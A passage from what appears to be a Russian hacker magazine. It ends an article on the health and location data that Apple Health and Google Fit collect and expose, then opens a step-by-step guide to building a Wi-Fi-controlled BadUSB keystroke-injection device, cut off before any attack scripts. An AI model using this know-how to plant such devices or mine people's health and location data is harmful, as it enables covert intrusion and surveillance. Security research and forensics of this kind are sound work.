2, software:5.1.2>" unit="count/min" creationDate="2019‐01‐06 14:35:
47 +0100" startDate="2019‐01‐06 14:23:53 +0100" endDate="2019‐01‐06
14:23:53 +0100" value="96">

Данные шагоме ра. Обрати внимание, что данные собираются из двух
источников: iPhone и часы.


<Record type="HKQuantityTypeIdentifierStepCount" sourceName="iPhone"
sourceVersion="12.1.2" device="<<HKDevice: 0x2832ad680>, name:
iPhone, manufacturer:Apple, model:iPhone, hardware:iPhone11,6,
software:12.1.2>" unit="count" creationDate="2019‐01‐06 14:51:45
+0100" startDate="2019‐01‐06 14:40:37 +0100" endDate="2019‐01‐06 14:
48:11 +0100" value="198"/>
<Record type="HKQuantityTypeIdentifierStepCount" sourceName="Oleg’s
Apple Watch" sourceVersion="5.1.2" device="<<HKDevice: 0x2832ad5e0>,
name:Apple Watch, manufacturer:Apple, model:Watch, hardware:Watch4,
2, software:5.1.2>" unit="count" creationDate="2019‐01‐06 14:50:55
+0100" startDate="2019‐01‐06 14:37:08 +0100" endDate="2019‐01‐06 14:
43:07 +0100" value="150"/>

Данные сер дце биения:


<Record type="HKQuantityTypeIdentifierHeartRateVariabilitySDNN"
sourceName="Oleg’s Apple Watch" sourceVersion="5.1.2" device="<<
HKDevice: 0x2832a2800>, name:Apple Watch, manufacturer:Apple, model:
Watch, hardware:Watch4,2, software:5.1.2>" unit="ms" creationDate=
"2019‐01‐07 14:31:58 +0100" startDate="2019‐01‐07 14:30:56 +0100"
endDate="2019‐01‐07 14:31:58 +0100" value="16.5784">
  <HeartRateVariabilityMetadataList>
   <InstantaneousBeatsPerMinute bpm="101" time="14:30:57,56"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:30:58,16"/>
   <InstantaneousBeatsPerMinute bpm="101" time="14:30:58,75"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:30:59,35"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:30:59,96"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:31:00,56"/>
   <InstantaneousBeatsPerMinute bpm="102" time="14:31:01,14"/>
   <InstantaneousBeatsPerMinute bpm="97" time="14:31:01,76"/>
   <InstantaneousBeatsPerMinute bpm="95" time="14:31:02,39"/>
   <InstantaneousBeatsPerMinute bpm="99" time="14:31:02,99"/>
   <InstantaneousBeatsPerMinute bpm="97" time="14:31:03,62"/>
   <InstantaneousBeatsPerMinute bpm="98" time="14:31:04,23"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:31:04,83"/>
   <InstantaneousBeatsPerMinute bpm="101" time="14:31:05,42"/>
   <InstantaneousBeatsPerMinute bpm="101" time="14:31:06,01"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:31:06,62"/>
   <InstantaneousBeatsPerMinute bpm="97" time="14:31:07,23"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:31:42,76"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:31:43,36"/>
   <InstantaneousBeatsPerMinute bpm="101" time="14:31:43,96"/>
   <InstantaneousBeatsPerMinute bpm="98" time="14:31:44,57"/>
   <InstantaneousBeatsPerMinute bpm="98" time="14:31:45,18"/>
   <InstantaneousBeatsPerMinute bpm="100" time="14:31:45,78"/>
   <InstantaneousBeatsPerMinute bpm="96" time="14:31:46,40"/>
   <InstantaneousBeatsPerMinute bpm="97" time="14:31:47,02"/>
   <InstantaneousBeatsPerMinute bpm="97" time="14:31:47,64"/>
   <InstantaneousBeatsPerMinute bpm="102" time="14:31:48,23"/>
   <InstantaneousBeatsPerMinute bpm="103" time="14:31:48,81"/>
   <InstantaneousBeatsPerMinute bpm="107" time="14:31:49,37"/>
   <InstantaneousBeatsPerMinute bpm="106" time="14:31:51,06"/>
   <InstantaneousBeatsPerMinute bpm="104" time="14:31:51,64"/>
   <InstantaneousBeatsPerMinute bpm="104" time="14:31:52,21"/>
   <InstantaneousBeatsPerMinute bpm="103" time="14:31:52,80"/>
   <InstantaneousBeatsPerMinute bpm="97" time="14:31:53,41"/>
  </HeartRateVariabilityMetadataList>
</Record>

Данные о прой ден ной дистанции:


<Record type="HKQuantityTypeIdentifierDistanceWalkingRunning" source
Name="Oleg’s Apple Watch" sourceVersion="5.1.2" device="<<HKDevice:
0x2832f9270>, name:Apple Watch, manufacturer:Apple, model:Watch,
hardware:Watch4,2, software:5.1.2>" unit="km" creationDate=
"2019‐01‐06 15:08:49 +0100" startDate="2019‐01‐06 14:58:43 +0100"
endDate="2019‐01‐06 15:06:35 +0100" value="0.178172"/>

Кроме того, доступны некоторые допол нительные типы данных, которые
сообщают часы: Basal Energy Burned, Active Energy Burned, Flights Climbed,
Apple Exercise Time.


<Record type="HKQuantityTypeIdentifierActiveEnergyBurned" sourceName=
"Oleg’s Apple Watch" sourceVersion="5.1.2" device="<<HKDevice: 0x2832
9d0e0>, name:Apple Watch, manufacturer:Apple, model:Watch, hardware:
Watch4,2, software:5.1.2>" unit="kcal" creationDate="2019‐01‐06 15:
31:53 +0100" startDate="2019‐01‐06 15:28:49 +0100" endDate=
"2019‐01‐06 15:29:50 +0100" value="0.424"/>

В целом приложе ние Apple Health дает вполне объ емную картинку активности
пользователя, позволяющую, к примеру, уличить в изме не невер ного мужа
(данные  InstantaneousBeatsPerMinute)  или  раскрыть  инсценированное
ограбление (данные шагомера и HKQuantityTypeIdentiﬁerFlightsClimbed):


<Record type="HKQuantityTypeIdentifierFlightsClimbed" sourceName=
"iPhone" sourceVersion="10.2.1" device="<<HKDevice: 0x283294320>,
name:iPhone, manufacturer:Apple, model:iPhone, hardware:iPhone8,1,
software:10.2.1>" unit="count" creationDate="2018‐02‐24 15:33:19
+0100" startDate="2018‐02‐24 14:01:57 +0100" endDate="2018‐02‐24 14:
01:57 +0100" value="1"/>

А вот дан ные о точ ном местоположении пользователя с использованием
встроенного в часы датчика GPS или самого iPhone сохраняются в том слу‐
чае, если  Apple  Health посчитает,  что пользователь не прос то  гуля ет
или бежит за автобусом, а занимается спортивной ходьбой или бегом. В про‐
тивном случае такие дан ные просто отсутству ют. Если же часы или приложе‐
ние посчитают, что ты тренируешь ся, то данные начнут собираться сплош ным
потоком с пери одич ностью в одну секун ду:


<Location date="2019‐01‐05 12:43:54 +0100" latitude="52.5118" longit
ude="13.3364" altitude="27.6155" horizontalAccuracy="1.31159" vertic
alAccuracy="1.11272" course="168.053" speed="0.783315"/>
<Location date="2019‐01‐05 12:43:55 +0100" latitude="52.5118" longit
ude="13.3364" altitude="27.6987" horizontalAccuracy="1.30859" vertic
alAccuracy="1.11246" course="168.053" speed="0.75217"/>
<Location date="2019‐01‐05 12:43:56 +0100" latitude="52.5118" longit
ude="13.3364" altitude="27.7774" horizontalAccuracy="1.30547" vertic
alAccuracy="1.11249" course="168.053" speed="0.719109"/>

В  таких  случаях  жизненные  параметры  организма  также  измеряются
с повышенной периодич ностью или постоянно.
  А вот как выглядят данные с Google Fit.





Google Fit: пройдено 3748 шагов, 2,41 км дис танция, калорий 1377, вре мя
физической активности 50 мин. При этом карта на одном из скриншотов
довольно стран ная: на самом деле участок был преодолен за рулем авто‐
мобиля совсем по дру гому маршруту.





Вот так выглядит участок агрегированных Google  Fit данных за период
с 14:30 по 15:30. В файле Daily Aggregations будет доступна информация,
сгруппированная в 15‐минут ные интервалы. Ее не так много:



  Start time, End time, Calories (kcal), Distance (m), Low latitude (deg),
  Low longitude (deg), High latitude (deg), High longitude (deg), Average
  speed (m/s), Max speed (m/s), Min speed (m/s), Step count, Average
  weight (kg), Max weight (kg), Min weight (kg), Inactive duration (ms),
  Walking duration (ms)
  14:30:00.000+01:00, 14:45:00.000+01:00, 21.970262804673375,
  81.47002220153809, 52.3498691, 14.5603561, 52.3498691, 14.5603561,
  1.3560495376586914, 1.361162781715393, 1.3509362936019897, 189, , , ,
  839979, 60021
  14:45:00.000+01:00, 15:00:00.000+01:00, 18.642008718815653,
  11.182665824890137, 52.3457901, 14.5852002, 52.3457901, 14.5852002, , ,
  , 269, , , , 890828, 9172
  15:00:00.000+01:00, 15:15:00.000+01:00, 57.92037990980161,
  234.93591034412384, 52.3452287, 14.5833228, 52.3454651, 14.584661,
  0.6185604934920054, 0.7937963008880615, 0.4872109591960907, 442, , , ,
  290734, 609266
  15:15:00.000+01:00, 15:30:00.000+01:00, 38.01473075330071,
  282.5838632583618, 52.3453065, 14.5836133, 52.3458285, 14.5853516,
  1.0011046724361665, 1.2798868417739868, 0.3900336027145386, 435, , , ,
  519858, 305148
  15:30:00.000+01:00, 15:45:00.000+01:00, 18.041664123535156, ,
  52.3145496, 14.5510705, 52.3170428, 14.588051, 21.795568063657157,
  32.099998474121094, 9.140000343322754, , , , , ,


Если у тебя нет часов или фитнес‐трекера, то для сбора дан ных будет исполь‐
зоваться толь ко сам телефон. В этом случае данные попада ют в папку Low
Accuracy. Сюда не входят маршруты, которые ты преодолел за рулем или в
общественном тран спорте, — только пешие прогулки или занятия спор том.


<Activity Sport="Other">
    <Id>2019‐01‐06T14:16:36.976Z</Id>
    <Notes>Walking</Notes>
    <Lap StartTime="2019‐01‐06T14:16:36.976Z">
        <Track>
            <Trackpoint>
                <DistanceMeters>0.0</DistanceMeters>
                <Time>2019‐01‐06T14:16:36.976Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>13.942784309387207</DistanceMeters>
                <Time>2019‐01‐06T14:16:59.061Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>105.96516132354736</DistanceMeters>
                <Time>2019‐01‐06T14:18:38.996Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>181.415753364563</DistanceMeters>
                <Time>2019‐01‐06T14:19:39.966Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>200.01529788970947</DistanceMeters>
                <Time>2019‐01‐06T14:19:55.202Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>258.8811311721802</DistanceMeters>
                <Time>2019‐01‐06T14:20:41.096Z</Time>
                <Position>
                    <LatitudeDegrees>52.3458285</LatitudeDegrees>
                    <LongitudeDegrees>14.5853516</LongitudeDegrees>
                </Position>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>258.8811311721802</DistanceMeters>
                <Time>2019‐01‐06T14:20:41.195Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>282.5838632583618</DistanceMeters>
                <Time>2019‐01‐06T14:21:42.124Z</Time>
            </Trackpoint>
        </Track>
        <DistanceMeters>282.5838632583618</DistanceMeters>
        <TotalTimeSeconds>305.148</TotalTimeSeconds>
        <Calories>26.090152740478516</Calories>
        <Intensity>Active</Intensity>
        <TriggerMethod>Manual</TriggerMethod>
    </Lap>
</Activity>

А вот что будет, если ты наденешь брас лет или часы, которые могут сообщать
данные в Google. Обрати внимание, данные хранятся в том же формате,
но лежат при этом в отдельной папке.


<Activity Sport="Other">
    <Id>2018‐12‐11T19:21:55.172Z</Id>
    <Notes>Walking</Notes>
    <Lap StartTime="2018‐12‐11T19:21:55.172Z">
        <Track>
            <Trackpoint>
                <DistanceMeters>0.0</DistanceMeters>
                <Time>2018‐12‐11T19:21:55.172Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>27.18842887878418</DistanceMeters>
                <Time>2018‐12‐11T19:22:23.299Z</Time>
            </Trackpoint>
            <Trackpoint>
                <DistanceMeters>62.03313636779785</DistanceMeters>
                <Time>2018‐12‐11T19:22:54.555Z</Time>
            </Trackpoint>
        </Track>
        <DistanceMeters>62.03313636779785</DistanceMeters>
        <TotalTimeSeconds>59.383</TotalTimeSeconds>
        <Calories>5.07724666595459</Calories>
        <Intensity>Active</Intensity>
        <TriggerMethod>Manual</TriggerMethod>
    </Lap>
</Activity>

Наконец, ты можешь просмотреть посуточную агре гацию в пап ке  Daily
Summaries:


Date,Calories (kcal),Distance (m),Low latitude (deg),Low longitude (
deg),High latitude (deg),High longitude (deg),Average speed (m/s),
Max speed (m/s),Min speed (m/s),Step count,Average weight (kg),Max
weight (kg),Min weight (kg),Inactive duration (ms),Walking duration (
ms)
2019‐01‐06,1893.2533778121408,1692.7585290074348,52.3145496,13.
3485443,52.5222746,14.588051,3.7923538250920985,32.099998474121094,0.
3485696017742157,3832,,,,48974765,2463627

Выводы? Apple Watch собирает боль ше данных, и они в целом более точные
даже без использования внешних датчиков (часов) прос то благода ря тому,
что приложение от Apple не стесняется привлекать встроенный в iPhone
шагомер. Данные Stand Hours рассчитываются некор ректно даже при исполь‐
зовании часов.
  Важный момент: Apple Health не возвра щает карты переме щений, а дан‐
ные местоположения сохраня ются толь ко в том слу чае, если приложение (или
часы) посчитает, что ты занимаешься спортивной тренировкой.
   Google Fit не использует, похоже, никакие датчики, кроме Signiﬁcant Motion
и определения мес тоположения (скорее все го, по выш кам, а не по спут‐
никам). В результате Fit возвращает лишь очень приб лизительную картину.
Использование внешних датчиков (например, встроенных в спор тивный тре‐
кер или часы, поддерживающие интеграцию с Google Fit) позволяет уточ нить
картину и добавить некото рые категории данных (пульс, давление), но нас‐
только тесной интегра ции, как между часами Apple Watch и системой iOS,
здесь нет. При этом Google Fit собирает данные о твоем местоположении
с использовани ем датчиков телефона независимо от того, занимаешься ты
спортивной активностью, просто гуляешь или едешь за рулем или в тран‐
спорте.


СИНХРОНИЗАЦИЯ И ЗАЩИТА ДАННЫХ
Как син хро низи руются и как защищены данные Apple Health, мы уже рас ска‐
зали. Если на все твои устройства уста новлена iOS 12, то данные Apple Health
будут надежно зашиф рованы, а ключ шифрования перешифрован пос редс‐
твом кода бло кировки экрана (или системным паролем, если речь идет
о macOS). Для доступа к данным пот ребуется логин (Apple  ID), пароль
от Apple  ID, одноразовый пароль двухфакторной аутентифика ции (если
отключить 2FA, то данные «Здоровья» не будут синхро низированы) и код бло‐
кировки экрана одного из устройств, на котором уже включена синхрониза‐
ция дан ных «Здоровья».
  В описан ной выше ситуации данные «Здоровья» не будут переда ны пра‐
воохранительным органам по запросу (точнее, они могут быть переданы,
но расшифровать полученную информацию будет невозможно). Не получить
информа цию и запросом через GDPR. Извлечь их можно либо путем синхро‐
низации на свежее устройство под управлением iOS (из которого их будет
довольно трудно извлечь: jailbreak для iOS 12 пока нет), либо с помощью спе‐
циализированного софта (Elcomsoft Phone Breaker). С другой стороны, если
есть устройство, на которое синхронизированы данные Health, то их можно
просто экспортировать в ZIP.
   Apple Health может «поделиться» данными с одним из многочис ленных
сторонних приложений, которые ты можешь установить или самостоятельно,
или по рекомендации самого приложения Apple Health. Так, для каждой
категории данных Apple Health рекомендует сра зу несколько приложений,
которые помогут собрать, обра ботать и проанализировать информацию.
Если ты установишь одно или нес колько таких приложений, а потом в нас‐
тройках сис темы разрешишь им доступ к данным Health, то при ложения смо‐
гут как пос тавлять информа цию в Apple Health, так и получать данные, соб‐
ранные Apple Health и другими подключенными сторонними при ложениями.
Что будут делать эти приложения с тво ими данными, как они собираются их
защищать и охранять, куда будут передавать и как хранить — известно только
со слов разработчиков таких приложений. Утечки случались. Наверное,
показательнее всего случай с приложением Strava, доступным для платформ
iOS и Android. Компания использовала приложение Strava Running and Cycling
GPS для сбо ра информа ции и на осно ве данных поль зователей составила
статистику и обнародовала местоположение воен нослу жащих воен ных баз
в США, Сирии и Нигерии. В общем‐то, это все, что тебе нужно знать об отно‐
шении сто ронних ком паний к персональным данным.
  В то же время вся информа ция из приложения Apple Health четко струк‐
турирована; все поля определены и описаны, и если дан ные удалось рас‐
шифровать, то анализировать их достаточно просто.
  В случае с Google дела обстоят и проще, и сложнее. Проще — потому что
все дан ные Google Fit дос тупны в облаке Google Account без какого‐либо
дополнительного шифрования. Их можно извлечь при помощи собствен ного
сервиса компании Google Takeout, можно получить по запросу от правоох‐
ранитель ных органов. Никакой дополнительной защиты или шифрования нет.
А вот анализ данных из Google Fit может оказаться сложнее. Дело в том, что
Google  Fit спо собен агрегировать информа цию из различных источников,
включая сторонние приложения и внешние дат чики. К сожалению, Google
не описывает структуру данных и не предоп ределяет катего рии, в результате
чего каж дое сторон нее при ложе ние может сообщать данные хоть и в стан‐
дартном формате, но с собственными обозначениями категорий и типов дан‐
ных. Ана лизи ровать информацию приходится вручную.


СУХОЙ ОСТАТОК
Принципи альное отличие между Apple Health и Google Fit не только в том,
какие типы информации собирает каждое при ложение, но и в том, как и
от кого эти дан ные защищены.
   Google  Fit собирает данные о местоположении. Если не используются
внешние датчики, то собирается только информация от Google Location Ser‐
vices на основе данных от сотовых вышек и GPS с периодичностью пять
минут. Количество шагов аппроксимируется на основе пройденной дис‐
танции и данных о телосложении пользователя, которые вводит сам поль‐
зователь. Если внешние датчики используют ся, то в приложение может пос‐
тупать дополнитель ная информация.
   Google Fit: синхронизация и защита данных. Все собранные данные син‐
хронизируются в учетную запись пользовате ля. Допол нительной защиты нет.
Шифрования нет. Данные доступны как самой компании Google, так и пра‐
воохранительным органам и любым желающим через сервис Google Takeout.
   Apple Health собирает данные на основе датчиков телефо на, включая
встроенный шагомер и альтиметр. Дан ные о местоположении в обычном сос‐
тоянии не регистрируются. Они регистрируют ся лишь в периоды, ког да сис‐
тема или Apple Watch опре деляют «спортивный» характер активности поль‐
зователя; в таких случаях координаты сохраняются ежесекун дно. Интересный
момент: Apple Health также просит пользователя ввести данные о телос‐
ложении, но использует их противо положно тому, как это делает Google. Если
Google Fit рассчитывает количес тво шагов пользователя по пройденной дис‐
танции и росту, то Apple Health рассчитает пройденную дистанцию на осно ве
роста поль зователя и количества шагов, которые зарегис трировал дат‐
чик‐шагомер   (за   исключением   времени   спортивных   тренировок).
При наличии внешних дат чиков (а ими могут выступать как часы Apple Watch,
так и множес тво сторонних устройств и приложений) собира ется заметно
больше данных.
  Начиная с iOS 11 Apple синхронизирует данные Health в облако. В iOS
11 данные «Здоровья» не имели какой‐то особой защиты; их мож но было
извлечь и рас шифровать точно так же, как и остальные син хронизи рованные
данные (фотографии, контакты, заметки, кален дари и прочее). Соответс твен‐
но, если данные в облако поступают с устройства, работа ющего под управле‐
нием iOS 11, то доступны они будут как самой компании Apple, так и пра воох‐
ранитель ным орга нам и всем желающим воспользоваться сер висом извле‐
чения данных через запрос GDPR.
  В iOS 12 использует ся принципиально другой подход к защите данных
«Здоровья». Теперь они защище ны ключом, который хранится в облачной
связке ключей iCloud Keychain. Этот ключ может быть получен в том и только
в том слу чае, если извес тны логин и пароль от Apple ID, получен одноразовый
код двухфакторной аутен тификации (а сам режим двух факторной аутен‐
тификации обязательно включен); наконец, рас шифро вать ключ получит ся,
только если известен код блокиров ки устройства, которое уже участвует
в синхрониза ции Apple Health. Соответственно, данные, полученные с устрой‐
ств под управлением iOS 12, зашифрованы и НЕ ДОС ТУПНЫ ни компании
Apple, ни правоохранительным органам, ни тем, кто хочет получить информа‐
цию через GDPR. Извлечь их можно либо посредством синхро низации
с новым устройством Apple (с iOS 12) и последующе го экспорта данных Apple
Health, либо, если лишнего устройства под управлением iOS 12 под рукой
нет,  при помощи  специализированного  при ложения  (Elcomsoft  Phone
Breaker).
   Сторонние приложения, которым предоставляется доступ  к данным
Google Fit и Apple Health, мы выделим в самос тоятельную группу. Количество
и разнообразие таких приложений не позволя ет проанализировать все
или даже самые популярные из них. Тем не менее уже были зарегистрирова‐
ны утечки дан ных из нескольких известных приложе ний. Разрешая доступ
к данным «Здоровья» стороннему приложению, нужно четко понимать, что
с этого момента ты сам отдал свои дан ные «на сторону». И если механизмы
защиты данных «Здоровья» в iOS извес тны и хорошо изучены, то политики
и механиз мы защиты твоих данных у сторонних ком паний будут рас полагаться
в диапазоне от «намного хуже» до «полностью отсутствуют».
ТРЮКИ

ЗЛАЯ УТКА
 С ДИСТАНЦИОННЫМ УПРАВЛЕНИЕМ
    СОБИРАЕМ И ПРОГРАММИРУЕМ
           BADUSB С WI‐FI





                                                         8bit
                                                   vegelin47@mail.ru




Ты, разумеется, знаешь истории о том, как хакеры исполь‐
зуют для атак устройства, похожие на флешку. Дос таточно
подобраться к серверу и подключить такой девайс, что бы
заполу чить удаленный кон троль. Сог ласись, очень похоже
на прототип Rubber Ducky. Одна ко «злая утка» — это всегда
разовая акция: один скетч и заранее известные дей ствия.
Сегодня мы приготовим  гораз до более  универсальную
модифи кацию.


           WARNING

                        Статья предназна чена для «белых хакеров», про‐
                    фессиональных  пентестеров  и  руководителей
                       службы информационной безопасности (CISO).
                    Ни автор, ни редакция не несут ответственности
                        за любой возможный вред, причиненный матери‐
                       алами данной статьи.



ЧУТЬ БОЛЬШЕ, ЧЕМ RUBBER DUCKY
Наверняка ты уже слышал про Rubber Ducky. Это устройство из разряда
BadUSB для HID‐ата ки. Подобного рода девайсы умеют эмулировать кла‐
виатуру и позволяют отправить любые команды, словно их набрал текущий
пользователь.
  В этих устройствах есть простой мик роконтроллер и память, в которую
записывается скетч (код для Arduino и подобных отладочных плат). Он содер‐
жит функцию эмуляции нужного устройства и набор выполняемых им дей‐
ствий. Как показывает прак тика, обычно это кла виатура и пос ледователь‐
ность «нажимаемых» на ней клавиш.
  В статье «Злой HID» уже было детально описано, как выбрать и под‐
готовить такой девайс, так что на этом останавливаться не буду. Стоит лишь
сказать, что опасность этого метода атаки заключается в скрытности и ско‐
рости исполнения.
  Конечно, у этих девайсов есть и свои недостатки. Во‐первых, нужно тща‐
тельно разведать пол ную конфигура цию компьютера‐жертвы. Во‐вторых,
перед реаль ной атакой нужно проверить, как она будет выполняться на мак‐
симально подоб ной тес товой системе, и внести необходимые правки —
в частности, подобрать оптимальные задер жки. В реальных условиях, скорее
всего, будет проблематично второй раз приб лизиться к атакуемому компь‐
ютеру, а если хоть один скан‐код кла виши будет отправлен не вовремя, то все
окажется нап расным. В‐треть их, можно использовать только один скетч.
Нельзя дописать какую‐то функцию на лету или прервать и перезапустить
набор дей ствий. Мы изготовим устройство, лишенное этих недостатков.


ГОТОВИМ WI-FI DUCKY
Практически это будет тот же самый Rubber Ducky, только с модулем Wi‐Fi.
Суть в том, что при его подключении к компьютеру скетч не выполняет ся сра‐
зу при подаче питания на пла ту (хотя такая функция тоже есть). В этот момент
создается точка дос тупа, которая ждет подключения. Соединиться с ней мож‐
но как со смартфона, так и с ноутбука и уже отту да в любой удобный момент
совершать необ ходимые действия.
  За осно ву можно взять Arduino MKR1000 с Wi‐Fi‐модулем Atmel AT‐
SAMW25 на бор ту, добавить библиотеку WiFi101 и готовый код отсюда. Одна‐
ко обойдется это в 35 долларов. Также есть готовый проект Cactus WHID. Он
стоит уже 14 дол ларов и выглядит как флешка, но доработать его будет слож‐
нее.
  Я предлагаю собрать более дешевый (меньше десяти долларов) и фун‐
кциональный девайс под названием Wi‐Fi Ducky. Его автор — Stefan Kremser
с ником «Космокурица», а железо для его кру тых самоде лок продается
в отдельном магазине на AliExpress. Там можно купить готовые DIY‐модули,
скачать код с гитхаба и повторить все шаг за шагом, однако мы пой дем нем‐
ного дру гим путем.
   Возьмем два устройства:
 • Arduino Pro Micro;





                               Arduino Pro Micro
 • WeMos D1 mini с микроконтроллером ESP‐8266EX и Wi‐Fi‐модулем стан‐
   дарта 802.11b/g/n на борту.





                       WeMos D1 mini

Нам необ ходимо будет соединить их, но вна чале — прошить.


             INFO

                     Все опи санные действия выполнялись на опе‐
                      рационной сис теме Windows 7 x64.



Прошив ка Arduino Micro Pro
Начнем с пла ты Arduino. Скачиваем и устанавливаем Arduino IDE. При уста‐
новке это го программного обеспечения заодно установятся все драйверы
для этого устрой ства, так что дополнительно ничего не надо будет устанав‐
ливать. Что бы под клю чить ее к компьюте ру, необ ходимо запастись OTG‐
адаптером или кабелем с надлежащими выходами, так как на плате рас‐
положен разъ ем mini‐USB.
  После уста новки программного обеспечения запускаем его и подключаем
Arduino к компьютеру. В меню «Инструменты» в раз деле «Плата» выбира ем
Arduino/Genuino  Micro.  Далее  в  том же меню  выбира ем  COM‐порт,
на котором определе но устройство. На этом нас тройка программного обес‐
печения завершена.
  Следующим шагом идем по ссылке, где рас положен скетч. На него дос‐
таточно взглянуть, чтобы понять, что он дела ет: пре образует команды типа
STRING в поддержи ваемый Arduino син таксис типа Keyboard.print(“”) и акти‐
вирует нуж ные контакты. Копируем его и вставляем в Arduino IDE. Нажимаем
кнопку «Загрузка» и через две‐три минуты получаем сообщение о том, что
скетч успешно заг ружен. Теперь при подаче питания на плату контроллер
активирует контакты TX, RX, GND и RAM, после чего переходит в режим ожи‐
дания команд.


Прошив ка WeMos D1 mini
Добрались до сле дующего компонента нашей злой утки на стероидах. В этот
раз нам потребуется перейти с micro‐USB на USB Type‐А. При первом под‐
ключении к компь юте ру Windows ругнется на неопределенное устройство,
поэтому необходимо ска чать драйвер CH341 c официаль ного сайта.
   Тут ничего сложного: извлекаем из архива EXE‐файл, запускаем его с пра‐
вами администра тора и нажимаем INSTALL. После этих нехитрых манипу‐
ляций в диспетчере устройств эта плата должна опре делиться как USB‐SERI‐
AL СР340. Поделюсь горьким опы том: если уста новить неверный драйвер, то
устройство определится, но название будет другое, и ничего не заработает.
Будь пре дель но внимательным!





              Правильное определение WeMos D1 mini

Теперь устрой ство готово к прошивке, и нам нужен про шивальщик. Я вос‐
пользуюсь NodeMCU ﬁrmware programmer. Заходим на GitHub и скачиваем
его в соответствии с версией твоей операционки. У меня это Win64.
Еще необходимо скачать саму прошивку. Их будет несколько вариаций, я ска‐
чивал esp8266_wiﬁ_duck_4mb.bin, как наиболее увесистый и фун кциональный
вариант.
  После этого запускаем и нас траиваем прошиваль щик. В поле COM Port
выбираем тот порт, на котором опре делилась пла та. Обычно программа сама
его  «видит» и подстав ляет необходимое  зна чение. Далее  перехо дим
во вкладку Conﬁg, где в пер вой строке нажимаем на шестерен ку и указываем
путь до прошивки, которую скачали. Значение оста ется 0x00000. Во вкладке
Advanced советую выставить параметр Baudrate на 115200. У меня прошив ка
записалась на такой ско рости, а если у тебя возникнет ошибка, то прос то
уменьши ее. Остальное оставля ем без изменения. В итоге дол жно получить‐
ся как на скриншоте.





  Значения программы NODEMCU FIRMWARE PROGRAMMER на вкладке
  Advanced

Когда все нехит рые манипуляции будут выпол нены, возвращаемся на вкладку
Operation и нажимаем Flash. Ниже кнопки расположен индикатор, который
покажет приб лизительное время загрузки прошивки в память, а зеленая
галочка с над писью NODEMCU TEAM даст знать, что прошивка закончилась.


Работа ем паяльником
После того как обе пла ты под готов лены и прошиты, необходимо соединить их
в одного «Франкенштейна». Для этого подключаем проводами контакты
в соответствии с таб лицей:


Arduino <‐‐> Wemios
TX      <‐‐> RX
RX      <‐‐> TX
GND     <‐‐> GND
RAM     <‐‐> 5U

Для начала лучше соединить их без пайки (на мон тажной плате очень удобно)
и проверить работоспособность. Под ключаем к компь ютеру Arduino Micro Pro
и тестируем. Если устройство завелось и работает как надо, то можно
собирать его уже с припоем. Мелких деталей там нет, перегреть особо
нечего, так что получится даже у того, кто недавно пос сорился с паяльником.
   Вот как получи лось у меня.





                    Как пример но дол жно получить ся


ПРОВЕРЯЕМ И РАЗБИРАЕМ ФУНКЦИОНАЛЬНОСТЬ
Самое время проверить, не сломалась ли какая‐то из плат во вре мя пайки.
Подключаем Arduino Micro Pro к компь ютеру и ждем, пока установится универ‐
сальный драйвер для HID‐устройства. «Ардуина» должна сигнализировать
двумя крас ными и одним зеленым светодиода ми.
  С телефо на, планшета или ноутбука смотрим список точек доступа Wi‐Fi.
Должна появиться новая AP под названием WiFi Duck. Если ее видим, зна‐
чит, все работает. Можно вскинуть руки, закричать «It’s Alive!» и дьявольски
захохотать во вспышках молний.





                        Точка доступа WiFi Duck

Подключаемся к ней. Пароль — quackquack (это дефолтный, его можно будет
изменить  в  настройках).  Теперь  открываем  бра узер, идем  по  адре‐
су 192.168.4.1 (это дефолтный адрес ESP‐8266EX в режиме AP) и видим
панель управления нашим устройством.
  На web‐интерфейсе все по‐спартански, ничего лишнего. Четыре стра‐
ницы, или вкладки, — две рабочие и две информационные:
 • Scripts . Эта вкладка предназначена для работы с уже готовыми скрип‐
   тами. Изна чально она пуста, но кнопкой UPLOAD NEW SCRIPT можно заг‐
   рузить написанный скетч в форматах .ino и .txt из памяти устройства (с
   которого зашли), после чего выполнить его в любое удобное вре мя. Мож‐
   но скрип ты писать самому или найти в интернете готовые решения, нап‐
  ример тут. Не все из них рабочие, необходимо будет заранее протес‐
   тировать (обо лочка поз воляет редактировать их). Памяти на все это дело
   предостаточно — почти 3 Мбайт.





                          Страница Scripts
 • Live  Execute . На этой странице расположено поле, в которое мы
  пишем скетч. Его мож но сразу выпол нить или сохранить. При сохранении
   он отобразится на стра нице Scripts . Язык написания скетча отличается
   от привычного в Arduino, поэтому ниже поля для ввода дана инструкция
   с коман дами и описанием каждой из них.





                        Страница Live Execute
 • Settings . Это стра ница настроек точки доступа. Тут можно поменять наз‐
   вание точ ки дос тупа, пароль, сделать ее скрытой. Так же можно ука зать
   скрипт, который будет выполняться сразу при подключении устройства
   к компьютеру.





                          Страница Settings
 • Info . Эта страница носит ско рее информационный харак тер. Тут находит‐
   ся ссылка на автора проекта, SDK, веб‐сервер, скрипты и их интерпре‐
   татор. Мож но также обновить версию прошивки ESP8266 «по воздуху»





                            Страница Info


ПИШЕМ СКРИПТЫ ДЛЯ АТАК
Наше киберо ружие подготовлено и начищено, осталось зарядить его скрип‐
тами. Обрати внимание на расста новку пауз в них (DELAY). Они нужны
для того, чтобы код не начал выпол няться слишком рано — прежде, чем
целевой компь ютер успеет на него отреагировать. Советую делать паузы
побольше, исходя из того, что система жер твы будет мед ленней твоей тес‐
товой. Это может быть из‐за отсутствия на ней SSD, меньшего объема опе‐
ративки, мед ленного процессора и так далее.
  Смоделируем такую ситуацию: Wi‐Fi Ducky уже подключен к цели, а мы
находим ся где‐то неподалеку. В системе есть учетная запись пользователя
с правами локального администратора, и она сейчас активна. Нам необ‐
